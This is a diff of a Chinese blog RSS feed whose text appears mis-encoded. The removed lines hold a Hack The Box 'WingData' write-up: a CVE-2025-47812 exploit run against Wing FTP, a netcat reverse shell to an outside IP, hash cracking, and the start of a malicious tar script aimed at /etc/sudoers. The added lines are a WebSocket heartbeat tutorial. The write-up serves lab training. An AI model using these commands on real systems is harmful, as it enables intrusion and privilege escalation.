-<p>éå¯¹Resumeçåä½è®¾ç½®æ¯ä¸ºäºè§£å³<code>éå¥ä¸åæº¯</code>é®é¢ãå¨å±è®°å½è¯æäº<code>ç¨æ·ç¡®å®æä¾äºè¿ä¸ªå¼</code>ãNodeè®°å½è¯æäº<code>è¿ä¸ªå¼ç¡®å®è¢«è¿ä¸ªç¹å®çinterruptå½æ°è°ç¨æ¶è´¹äº</code>ãä¸ä¸ªNodeåé¨å¯ä»¥è¿ç»­è°ç¨å¤æ¬¡interruptå½æ°ï¼ç³»ç»éè¦æé¡ºåºè®°å½è¯¥Nodeæ¶è´¹è¿çææResume Valueï¼ä»¥ä¾¿å¨âæ¶é´æè¡âæéè¯æ¶è½å¤ç²¾ç¡®å¯¹é½ã</p>
-<p>å½æä»¬è°ç¨interruptå½æ°å®æ½äººä¸ºä¸­æ­æ¶ï¼åºå±å®éä¸ä¼æåºä¸ä¸ª<code>GraphInterrupt</code>å¼å¸¸ï¼Pregeléè¿æè·è¿ä¸ªå¼å¸¸è¿èçæéå¯¹æ§çPendingWriteï¼æä»¥éå¯¹åä¸ä¸ªä»»å¡æå¯è½æä¸ä¸ªå¯ä¸çä¸­æ­ç±»åçPendingWriteãç±äºæ¢å¤æ§è¡æ»æ¯ä¼<code>ä»å¤´æ§è¡Nodeå½æ°</code>ï¼æä»¥åºäºä¸­æ­çPendingWriteå¹¶ä¸ä¼æ¢å¤æ§è¡é æä»»ä½å½±åãæä»¥å½æä»¬å®æç¬¬äºæ¬¡æ¢å¤è°ç¨åï¼æä¹åçä¸­æ­PendingWriteåæ çæ¯éå¯¹ç¬¬äºæ¬¡interruptå½æ°çè°ç¨ï¼å¯¹åºInterruptå¯¹è±¡çå¼ä¸º<code>2nd interrupt</code>ã</p>
-<p>Resume Valueå¿é¡»æç§é¡ºåºæä¾ï¼å ä¸ºæ¯éå°ä¸ä¸ªinterrptå½æ°çè°ç¨ï¼é½ä¼å©ç¨åé¢ä»ç»è¿çè®¡ç®å¨æä¾çç´¢å¼ï¼ä»Resume Valueåè¡¨ä¸­è¯»åResume Valueä½ä¸ºè¯¥è°ç¨çè¿åå¼ï¼æä»¥æä¹åçç¬¬äºä¸ªåºäºæ¢å¤çPendingWriteå¯¹åºçå¼åæäºåå«ä¸¤ä¸ªResume Valueçåè¡¨ï¼['1st resume', '2nd resume']ï¼ã</p>
-<p>å¨éå¯¹ç¬¬ä¸ä¸ªä¸­æ­çæ¢å¤æ§è¡ç»æåï¼fooNodeå®æäºå®çæ§è¡ä»»å¡ï¼èbarå¯¹åºçä»»å¡æ¬èº«å°±æ¯æåç¶æï¼æä»¥æ´ä¸ªSuperstepé¡ºå©ç»æï¼èªç¶ä¹å°±ä¸å­å¨Pending Writeäºã</p>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 09:12">2026-02-20 09:11</span>&nbsp;
-<a href="https://www.cnblogs.com/jaydenai">JaydenAI</a>&nbsp;
-éè¯»(<span id="post_view_count">43</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19625923);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625923', targetLink: 'https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes', title: '[æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å' })">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
@@ -2237,7 +1613,7 @@ public class PipedInputStream extends InputStream {
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 22:08">2026-02-19 22:07</span>&nbsp;
 <a href="https://www.cnblogs.com/Carey-ccl">Carey_ccl</a>&nbsp;
-éè¯»(<span id="post_view_count">34</span>)&nbsp;
+éè¯»(<span id="post_view_count">51</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19625392);return false;">æ¶è</a>&nbsp;
@@ -2326,14 +1702,14 @@ f(\mathbf{X})=f(\mathbf{X}^{*})+\nabla{f(\mathbf{X}^{*})^{T}}(\mathbf{X}-\mathbf
     </description>
     </item>
 <item>
-    <title><![CDATA[ ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp ]]></title>
-    <link>https://www.cnblogs.com/DSchenzi/p/19625276</link>
-    <guid>7c7087de627cf6a2a01a9d74085b7941</guid>
+    <title><![CDATA[ FastAPIå®æï¼WebSocketé¿è¿æ¥ä¿æä¸å¿è·³æºå¶ï¼ä»å¥é¨å°å¡«å ]]></title>
+    <link>https://www.cnblogs.com/ymtianyu/p/19625144</link>
+    <guid>dcd447542c742ad2b9f12ead8a57503f</guid>
     <description>
     <![CDATA[ 
             <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19625276" title="åå¸äº 2026-02-19 20:05">
-    <span role="heading" aria-level="2">ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp</span>
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ymtianyu/p/19625144" title="åå¸äº 2026-02-19 17:05">
+    <span role="heading" aria-level="2">FastAPIå®æï¼WebSocketé¿è¿æ¥ä¿æä¸å¿è·³æºå¶ï¼ä»å¥é¨å°å¡«å</span>
     
 
 </a>
@@ -2341,221 +1717,494 @@ f(\mathbf{X})=f(\mathbf{X}^{*})+\nabla{f(\mathbf{X}^{*})^{T}}(\mathbf{X}-\mathbf
             </h1>
             <div class="clear"></div>
             <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="wingdata">WingData</h1>
-<h2 id="ä¿¡æ¯æ¶é">ä¿¡æ¯æ¶é</h2>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200443486-1691206510.png" alt="image-20260219182401835" loading="lazy"></p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444147-1082259586.png" alt="image-20260219182537800" loading="lazy"></p>
-<p>å¾å°ä¸ä¸ªftp.wingdata.htbï¼ä¹å°è¿ä¸ªå ä¸</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444607-2041651593.png" alt="image-20260219182636761" loading="lazy"></p>
-<p>Wing FTP Server v7.4.3</p>
-<p>éè¿æå¯»cveæ¯ CVE-2025-47812</p>
-<h2 id="æ¼æ´å©ç¨cve-2025-47812">æ¼æ´å©ç¨ï¼CVE-2025-47812ï¼</h2>
-<p><a href="https://github.com/4m3rr0r/CVE-2025-47812-poc" target="_blank" rel="noopener nofollow">4m3rr0r/CVE-2025-47812-poc: Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812)</a></p>
-<pre><code class="language-kotlin">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami" -v
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444925-1620471614.png" alt="image-20260219183211504" loading="lazy"></p>
-<p><strong>ç¶ååå¼¹shell</strong></p>
-<pre><code class="language-kotlin">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.16.5 8888 -e /bin/sh" -v
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        æ¬æéè¿å®ææ¡ä¾ï¼è¯¦ç»è®²è§£FastAPIä¸JavaScriptå®ç°WebSocketé¿è¿æ¥ä¿æçå¿è·³æºå¶ï¼åæ¬ååç«¯ä»£ç ãåæ°è°ä¼åå¸¸è§é·é±ï¼å¸®å©ä½ æé ç¨³å®å¯é çååéä¿¡ã
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<div style="max-width: 100%; margin: 0 auto">
+<p style="font-size: 16px; color: rgba(93, 109, 126, 1); background-color: rgba(248, 249, 250, 1); padding: 12px 16px; border-radius: 8px; margin: 20px 0">ð æè¦ï¼æ¬æéè¿ä¸ä¸ªçå®çä¸çº¿æ¡ä¾ï¼è¯¦ç»è®²è§£FastAPIä¸JavaScriptå®ç°WebSocketé¿è¿æ¥ä¿æçå¿è·³æºå¶ãä½ ä¼äºè§£ä¸ºä»ä¹è¿æ¥ä¼æ­ãå¿è·³åçæ¯ä»ä¹ãååç«¯ä»£ç æä¹åï¼ä»¥åé£äºææ¡£éæ²¡åçè°ä¼é·é±ãç§çåï¼è®©ä½ çå®æ¶éä¿¡ç¨³å¦èçã</p>
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445289-1452625655.png" alt="image-20260219183719631" loading="lazy"></p>
-<p>ç¶åå¨<code>/opt/wftpserver/Data/1/users</code>ä¸çwacky.xmlè·å¾ç¨æ·å å¯å­æ®</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445708-1521256185.png" alt="image-20260219184040177" loading="lazy"></p>
-<pre><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
-</code></pre>
-<p><strong>çç ´hash(WingFTP ä½¿ç¨SHA256ç®æ³ï¼å¹¶ä½¿ç¨çå¼âWingFTPâä¸ºå å¯æ¹å¼)</strong></p>
-<pre><code class="language-kotlin">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446045-1809595022.png" alt="image-20260219184927089" loading="lazy"></p>
-<p>å¾å°å¯ç <code>!#7Blushing^*Bride5</code></p>
-<p>wacky/c</p>
-<p><strong>ç¶åsshè¿æ¥</strong></p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446347-1318255688.png" alt="image-20260219185219510" loading="lazy"></p>
-<p>å¾å°user.txt</p>
-<h2 id="æéæå">æéæå</h2>
-<p>åsudo -lçä¸ä¸</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446644-1829574816.png" alt="image-20260219185311322" loading="lazy"></p>
-<p>å¯ä»¥çå°æä¸ä¸ªpyèæ¬</p>
-<p>æä»¬å»çä¸ä¸</p>
-<pre><code>cat /opt/backup_clients/restore_backup_clients.py
-</code></pre>
-<pre><code class="language-python">#!/usr/bin/env python3
-import tarfile
-import os
-import sys
-import re
-import argparse
+<p style="font-size: 16px; margin: 20px 0">ä½ æ¯ä¸æ¯ä¹éå°è¿ââWebSocketè¿æ¥å¨ä¸å¨å°±æ­å¼ï¼å°¤å¶æ¯å¨ç§»å¨ç«¯ï¼ç¨æ·åæ¢ä¸ªWi-Fiæèçµæ¢¯éä¿¡å·æä¸ä¸ï¼æ¶æ¯å°±æ¶ä¸å°äºï¼ð± ç¨æ·æè¯è¯´âAPPæ¶æ¯å»¶è¿âï¼ä½ ä¸æ¥æ¥å¿ï¼æ»¡å±é½æ¯<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">WebSocket disconnected</code>ï¼ç¶åç¯çéè¿ï¼æå¡å¨ååå±±å¤§ï¼ç¨æ·ä½éªç¨ç¢ã</p>
+<p style="font-size: 16px; margin: 20px 0">æäºé¡¹ç®å¾çäºï¼è§å¾WebSocketè¿ä¸å°±è¡äºï¼ç»æçº¿ä¸è·äºåå¤©ï¼è¿ç»´å°å¥å°±åæ¥æ¥è­¦ï¼è¿æ¥æ°å¿½é«å¿½ä½ï¼å¾å¤è¿æ¥å­æ´»ä¸å°2åéãæ¥æ¥å¿ï¼å¥½å®¶ä¼ï¼Nginxé»è®¤<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">proxy_read_timeout</code> 60ç§ï¼å ä¸ç§»å¨ç½ç»è¿è¥åä¼ææé¿æ¶é´æ æµéçè¿æ¥ï¼ååå¤¹å»ï¼è¿æ¥å¨æ­äºãð­</p>
+<p style="font-size: 16px; margin: 20px 0"><strong style="color: rgba(186, 55, 42, 1)">æ ¸å¿ç»è®ºï¼</strong>WebSocketé¿è¿æ¥ä¿æï¼ä¸è½é âè¿ä¸å°±ä¸ç®¡âï¼å¿é¡»å¼å¥å¿è·³æºå¶ââå°±åä¸¤ä¸ªäººæçµè¯ï¼æ¯éä¸ä¼å¿é®ä¸å¥âåï¼è¿å¨åï¼âãä»å¤©æå°±æFastAPIåç«¯ + JavaScriptåç«¯çå®æ´å¿è·³å®ç°ï¼æ°å¼äºæç¢äºè®²ç»ä½ å¬ï¼é¡ºä¾¿ææè¸©è¿çåæ çº¢ã</p>
 
-BACKUP_BASE_DIR = "/opt/backup_clients/backups"
-STAGING_BASE = "/opt/backup_clients/restored_backups"
+<div style="background-color: rgba(240, 247, 255, 1); padding: 16px; border-radius: 8px; margin: 25px 0">
+<p style="font-size: 18px; font-weight: 600; margin: 0 0 10px">ð¦ æ¬æè·¯çº¿å¾</p>
+<div style="margin-left: 8px">
+<p style="margin: 6px 0">ð¹ ä¸ºä»ä¹WebSocketä¼æ­ï¼ââ ä¸­é´ä»¶è¶æ¶ãç½ç»ç¶æåå</p>
+<p style="margin: 6px 0">ð¹ å¿è·³åçï¼ping-pong è¿æ¯ pong-pingï¼</p>
+<p style="margin: 6px 0">ð¹ FastAPIåç«¯ï¼æ¥æ¶å¿è·³æ¶æ¯ + è¶æ¶ç®¡ç</p>
+<p style="margin: 6px 0">ð¹ JavaScriptåç«¯ï¼å®æ¶åéå¿è·³ + æ­çº¿éè¿</p>
+<p style="margin: 6px 0">ð¹ å®æ´å¯è¿è¡ä»£ç ç¤ºä¾</p>
+<p style="margin: 6px 0">ð¹ é£äºå¹´æè¸©è¿çåï¼é´éè®¾ç½®ãéå¤å®æ¶å¨ãæå¡ç«¯ä¸»å¨æ­å¼ï¼</p>
+</div>
+</div>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð§  ç¬¬ä¸é¨åï¼è¿æ¥ä¸ºä»ä¹ä¼æ­ï¼</h2>
+<p style="font-size: 16px; margin: 20px 0">æWebSocketæ³è±¡æä¸æ¡æ°´ç®¡ï¼æ°æ®å°±æ¯æ°´ãå¦ææ°´ç®¡ä¸ç´æµæ°´ï¼å®å°±ä¸ä¼å µãä½è¦æ¯ä½ åå¤©ä¸æ¾æ°´ï¼ä¸­é´çè·¯ç±å¨ãé²ç«å¢å°±è§å¾âå¿ï¼è¿ç®¡å­æ¯ä¸æ¯åºå¼äºï¼âââ<strong style="color: rgba(186, 55, 42, 1)">ååä¸åç»ä½ æäº</strong>ãå°¤å¶æ¯å¨ç§»å¨ç½ç»ä¸ï¼è¿è¥åçNATç½å³ç©ºé²è¶æ¶å¯è½åªæ30ç§å°å åéãè¿ææä»¬å¸¸ç¨çNginxï¼é»è®¤<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">proxy_read_timeout</code>æ¯60ç§ï¼ä¸æ¦60ç§åæ²¡ææ°æ®ä»åç«¯åå°å®¢æ·ç«¯ï¼Nginxå°±ä¼èªä½ä¸»å¼ æ­å¼è¿æ¥ã</p>
+<p style="font-size: 16px; margin: 20px 0">æä»¥ï¼è¦æ³è®©è¿æ¥é¿å­ï¼å¯ä¸çæ¹æ³å°±æ¯<strong style="color: rgba(186, 55, 42, 1)">å®æåéä¸äºâæ ç¨âçæ°æ®</strong>ï¼åè¯ä¸­é´ä»¶ï¼âæè¿æ´»çï¼å«ç æï¼âââè¿å°±æ¯å¿è·³ã</p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð ç¬¬äºé¨åï¼å¿è·³æºå¶çä¸¤ç§å§¿å¿</h2>
+<p style="font-size: 16px; margin: 20px 0">å¿è·³æ¬è´¨æ¯ä¸ç§<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">ping/pong</code>æ¨¡å¼ãWebSocketåè®®æ¬èº«ææ§å¶å¸§<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">Ping</code>å<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">Pong</code>ï¼ä½æµè§å¨åçJSçWebSocket APIå¹¶æ²¡æç´æ¥æ´é²åéPingå¸§çæ¹æ³ï¼æä»¥æä»¬ä¸è¬ç¨æ®éæ¶æ¯æ¨¡æï¼</p>
+<div style="margin-left: 8px">
+<p style="margin: 6px 0">â¨ æ¹æ¡Aï¼å®¢æ·ç«¯å®æ¶åé<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">ping</code>æ¶æ¯ï¼æå¡å¨æ¶å°åç«å³åå¤<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">pong</code>ã</p>
+<p style="margin: 6px 0">â¨ æ¹æ¡Bï¼æå¡å¨å®æ¶åé<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">ping</code>ï¼å®¢æ·ç«¯åå¤<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">pong</code>ãä½åæ ·ï¼å®¢æ·ç«¯éè¦è½è§£æå¹¶åå¤ã</p>
+</div>
+<p style="font-size: 16px; margin: 20px 0">æ´å¸¸è§çåæ³æ¯<strong style="color: rgba(186, 55, 42, 1)">å®¢æ·ç«¯ä¸»å¨åå¿è·³ï¼æå¡å¨åªéååºæè®°å½</strong>ãä¸ºå¥ï¼å ä¸ºå®¢æ·ç«¯æ´è½æç¥ç½ç»ååï¼ä¸æ­å¼åè½ç«å³éè¿ãä¸é¢æå°±ä»¥å®¢æ·ç«¯åå¿è·³ä¸ºä¾ï¼ä¸ä»£ç ã</p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">âï¸ ç¬¬ä¸é¨åï¼FastAPIåç«¯å®æ</h2>
+<p style="font-size: 16px; margin: 20px 0">åæ­ä¸ä¸ªæç®åçFastAPI WebSocketç«¯ç¹ãè¿éæç¨äº<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">/ws</code>è·¯å¾ï¼æ¥æ¶å¿è·³æ¶æ¯ï¼çº¦å®JSONæ ¼å¼<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">{"type": "ping"}</code>ï¼ï¼å¹¶åå¤<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">{"type": "pong"}</code>ãåæ¶ï¼ä¸ºäºåæ¶æ¸çæ­»è¿æ¥ï¼æä¼è®°å½æ¯ä¸ªè¿æ¥çæåå¿è·³æ¶é´ï¼å¯å¨ä¸ä¸ªåå°ä»»å¡æ£æ¥è¶æ¶ï¼æ¯å¦60ç§æ²¡æ¶å°å¿è·³å°±ä¸»å¨closeï¼ã</p>
+<pre class="language-python highlighter-hljs"><code>from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+import asyncio
+import json
+from datetime import datetime, timedelta
 
-def validate_backup_name(filename):
-    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
-        return False
-    client_id = filename.split('_')[1].rstrip('.tar')
-    return client_id.isdigit() and client_id != "0"
+app = FastAPI()
 
-def validate_restore_tag(tag):
-    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
+class ConnectionManager:
+    def __init__(self):
+        self.active_connections: dict[WebSocket, datetime] = {}
+        self._heartbeat_check_interval = 30   # æ¯30ç§æ£æ¥ä¸æ¬¡
+        asyncio.create_task(self.heartbeat_checker())
 
-def main():
-    parser = argparse.ArgumentParser(
-        description="Restore client configuration from a validated backup tarball.",
-        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
-    )
-    parser.add_argument(
-        "-b", "--backup",
-        required=True,
-        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, "
-             "where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)"
-    )
-    parser.add_argument(
-        "-r", "--restore-dir",
-        required=True,
-        help="Staging directory name for the restore operation. "
-             "Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). "
-             "Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1â24 characters)."
-    )
+    async def connect(self, websocket: WebSocket):
+        await websocket.accept()
+        self.active_connections[websocket] = datetime.utcnow()
+        print(f"æ°è¿æ¥å å¥ï¼å½åè¿æ¥æ°ï¼{len(self.active_connections)}")
 
-    args = parser.parse_args()
+    def disconnect(self, websocket: WebSocket):
+        if websocket in self.active_connections:
+            del self.active_connections[websocket]
+            print(f"è¿æ¥æ­å¼ï¼å½åè¿æ¥æ°ï¼{len(self.active_connections)}")
 
-    if not validate_backup_name(args.backup):
-        print("[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)", file=sys.stderr)
-        sys.exit(1)
+    async def handle_messages(self, websocket: WebSocket):
+        try:
+            while True:
+                data = await websocket.receive_text()
+                try:
+                    msg = json.loads(data)
+                except:
+                    continue
+                # å¦ææ¯å¿è·³pingï¼æ´æ°æåå¿è·³æ¶é´å¹¶åå¤pong
+                if msg.get("type") == "ping":
+                    self.active_connections[websocket] = datetime.utcnow()
+                    await websocket.send_text(json.dumps({"type": "pong"}))
+                else:
+                    # å¶ä»ä¸å¡æ¶æ¯ï¼æéå¤ç
+                    await websocket.send_text(json.dumps({"type": "echo", "data": msg}))
+        except WebSocketDisconnect:
+            self.disconnect(websocket)
 
-    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
-    if not os.path.isfile(backup_path):
-        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
-        sys.exit(1)
+    async def heartbeat_checker(self):
+        while True:
+            await asyncio.sleep(self._heartbeat_check_interval)
+            now = datetime.utcnow()
+            timeout = timedelta(seconds=70)  # è¶è¿70ç§æ²¡å¿è·³å°±æ­å¼
+            dead_conns = []
+            for ws, last_ping in self.active_connections.items():
+                if now - last_ping &gt; timeout:
+                    dead_conns.append(ws)
+            for ws in dead_conns:
+                try:
+                    await ws.close(code=1000, reason="heartbeat timeout")
+                except:
+                    pass
+                self.disconnect(ws)
 
-    if not args.restore_dir.startswith("restore_"):
-        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
-        sys.exit(1)
+manager = ConnectionManager()
 
-    tag = args.restore_dir[8:]
-    if not tag:
-        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
-        sys.exit(1)
+@app.websocket("/ws")
+async def websocket_endpoint(websocket: WebSocket):
+    await manager.connect(websocket)
+    await manager.handle_messages(websocket)</code></pre>
+<p style="font-size: 16px; margin: 20px 0"><strong style="color: rgba(186, 55, 42, 1)">ð éç¹è¯´æï¼</strong> <span style="display: block; margin-left: 16px; margin-top: 6px">- <code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">handle_messages</code>éåªå¤çå¿è·³ï¼å¶ä»ä¸å¡æ¶æ¯å¯ä»¥èªå®ä¹ã</span> <span style="display: block; margin-left: 16px">- åå°å¿è·³æ£æ¥çº¿ç¨æ¯30ç§è·ä¸æ¬¡ï¼å¦ææè¿æ¥è¶è¿70ç§æ²¡æ¶å°å¿è·³ï¼å°±ä¸»å¨å³é­ãè¿ä¸ª70ç§ä¸å®è¦å¤§äºå®¢æ·ç«¯çå¿è·³é´éï¼æ¯å¦å®¢æ·ç«¯30ç§åä¸æ¬¡ï¼é£70ç§å¤§æ¦æ¼æ2æ¬¡é½æ²¡åå¤ææ­ï¼é²æ­¢ç½ç»æå¨è¯¯æï¼ã</span> <span style="display: block; margin-left: 16px">- æ³¨æ<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">WebSocketDisconnect</code>çæè·ï¼åæ¶æ¸çå­å¸ï¼é¿ååå­æ³æ¼ã</span></p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð» ç¬¬åé¨åï¼JavaScriptåç«¯å®ç°</h2>
+<p style="font-size: 16px; margin: 20px 0">åç«¯ä¸»è¦åä¸ä»¶äºï¼å»ºç«è¿æ¥ãå®æ¶åå¿è·³ãçå¬æ­å¼èªå¨éè¿ãæä¹ æ¯æWebSocketå°è£æä¸ä¸ªç±»ï¼æ¹ä¾¿å¤ç¨ãç´æ¥ä¸ä»£ç ï¼</p>
+<pre class="language-javascript highlighter-hljs"><code>class WebSocketClient {
+    constructor(url) {
+        this.url = url;
+        this.ws = null;
+        this.heartbeatInterval = 30000; // 30ç§ä¸æ¬¡å¿è·³
+        this.reconnectInterval = 3000;   // æ­çº¿å3ç§éè¿
+        this.heartbeatTimer = null;
+        this.reconnectTimer = null;
+        this.connect();
+    }
 
-    if not validate_restore_tag(tag):
-        print("[!] Restore tag must be 1â24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
-        sys.exit(1)
+    connect() {
+        this.ws = new WebSocket(this.url);
+        this.ws.onopen = () =&gt; {
+            console.log('WebSocket å·²è¿æ¥');
+            // è¿æ¥æååï¼å¯å¨å¿è·³
+            this.startHeartbeat();
+            // å¦æä¹åæéè¿å®æ¶å¨ï¼æ¸æ
+            if (this.reconnectTimer) {
+                clearTimeout(this.reconnectTimer);
+                this.reconnectTimer = null;
+            }
+        };
 
-    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
-    print(f"[+] Backup: {args.backup}")
-    print(f"[+] Staging directory: {staging_dir}")
+        this.ws.onmessage = (event) =&gt; {
+            const data = JSON.parse(event.data);
+            if (data.type === 'pong') {
+                console.log('æ¶å°å¿è·³pongï¼è¿æ¥æ­£å¸¸');
+                // å¯ä»¥å¨è¿éæ´æ°UIæ¾ç¤ºæåå¿è·³æ¶é´ï¼ä½ä¸å¿é¡»
+            } else {
+                // å¤çå¶ä»ä¸å¡æ¶æ¯
+                console.log('ä¸å¡æ¶æ¯', data);
+            }
+        };
 
-    os.makedirs(staging_dir, exist_ok=True)
+        this.ws.onclose = (e) =&gt; {
+            console.log('WebSocket å³é­', e.reason);
+            // åæ­¢å¿è·³
+            this.stopHeartbeat();
+            // å°è¯éè¿
+            this.reconnect();
+        };
 
-    try:
-        with tarfile.open(backup_path, "r") as tar:
-            tar.extractall(path=staging_dir, filter="data")
-        print(f"[+] Extraction completed in {staging_dir}")
-    except (tarfile.TarError, OSError, Exception) as e:
-        print(f"[!] Error during extraction: {e}", file=sys.stderr)
-        sys.exit(2)
+        this.ws.onerror = (err) =&gt; {
+            console.error('WebSocket éè¯¯', err);
+            this.ws.close();
+        };
+    }
 
-if __name__ == "__main__":
-    main()
-</code></pre>
-<p>æä»¬å©ç¨è¿ä¸ªèæ¬çætaræä»¶</p>
-<pre><code class="language-python">#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-çææ¶ætaræä»¶çæ¼æ´å©ç¨èæ¬
-ä½ç¨ï¼æé åå«å¤å±ç®å½ãç¬¦å·é¾æ¥çtaræä»¶ï¼å°è¯çªç ´è·¯å¾éå¶åå¥/etc/sudoers
-"""
+    startHeartbeat() {
+        this.heartbeatTimer = setInterval(() =&gt; {
+            if (this.ws &amp;&amp; this.ws.readyState === WebSocket.OPEN) {
+                this.ws.send(JSON.stringify({ type: 'ping' }));
+                console.log('åéå¿è·³ping');
+            } else {
+                console.warn('è¿æ¥æªå¼å¯ï¼åæ­¢åéå¿è·³');
+                this.stopHeartbeat();
+            }
+        }, this.heartbeatInterval);
+    }
 
-import tarfile
-import os
-import io
-import sys
+    stopHeartbeat() {
+        if (this.heartbeatTimer) {
+            clearInterval(this.heartbeatTimer);
+            this.heartbeatTimer = null;
+        }
+    }
 
-def create_malicious_tar(output_path="/tmp/backup_9999.tar"):
-    """
-    åå»ºæ¶ætaræä»¶ï¼åå«è·¯å¾éååç¬¦å·é¾æ¥çæé 
+    reconnect() {
+        this.stopHeartbeat();
+        if (!this.reconnectTimer) {
+            this.reconnectTimer = setTimeout(() =&gt; {
+                console.log('å°è¯éè¿...');
+                this.connect();
+            }, this.reconnectInterval);
+        }
+    }
+
+    // ä¸»å¨å³é­è¿æ¥ï¼æ¯å¦é¡µé¢å¸è½½æ¶ï¼
+    close() {
+        this.stopHeartbeat();
+        if (this.ws) {
+            this.ws.close();
+        }
+    }
+}
+
+// ä½¿ç¨ç¤ºä¾
+const client = new WebSocketClient('ws://ä½ çåå/ws');
+// é¡µé¢å³é­åä¸»å¨æ¸ç
+window.addEventListener('beforeunload', () =&gt; client.close());</code></pre>
